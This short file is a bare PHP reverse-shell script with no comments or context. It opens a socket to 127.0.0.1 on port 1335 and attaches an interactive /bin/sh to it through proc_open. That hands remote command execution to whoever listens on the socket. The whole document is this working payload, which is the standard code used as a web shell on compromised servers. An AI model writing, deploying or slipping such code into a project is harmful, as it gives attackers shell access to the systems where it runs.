<?php
$sock=fsockopen("127.0.0.1",1335);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
